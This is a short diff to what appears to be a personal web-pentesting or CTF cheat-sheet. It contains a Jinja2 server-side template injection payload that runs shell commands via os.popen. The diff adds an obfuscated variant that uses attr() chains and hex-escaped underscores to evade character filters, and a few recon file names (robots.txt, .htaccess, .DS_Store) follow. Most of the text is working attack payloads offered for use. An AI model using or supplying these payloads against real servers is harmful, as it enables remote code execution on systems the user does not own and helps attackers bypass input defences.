@@ -1,5 +1,5 @@
 {{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }} - for python jinga sst1 
-
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}} - for python jinga ssti if _ . {} are blocked
 keep Google from indexing website : robots.txt
 apache : /.htaccess
 stored on mac : .DS_Store
